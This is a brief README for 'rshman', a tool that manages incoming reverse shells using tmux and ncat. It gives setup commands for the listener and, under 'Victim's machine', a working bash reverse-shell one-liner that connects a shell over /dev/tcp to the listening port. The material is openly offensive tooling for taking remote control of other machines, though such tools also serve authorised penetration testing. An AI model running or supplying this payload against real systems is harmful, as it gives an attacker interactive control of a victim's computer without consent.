# rshman

A simple reverse shell manager using `tmux` and `ncat`.

## Usage

Listening on port

```shell
git clone https://github.com/djosix/rshman.git
cd rshman

./start 11111 # you will attach to a tmux session called 'rshman'
```

Victim's machine

```shell
bash -c 'bash -i >& /dev/tcp/127.0.0.1/11111 0<&1'
# Once connected to the listening port, the script will create a
# window in our tmux session.
# Just switch to that window and interact with the client.
```

Stop the server and cleanup

```shell
./clean # kill session and remove all socket files
```
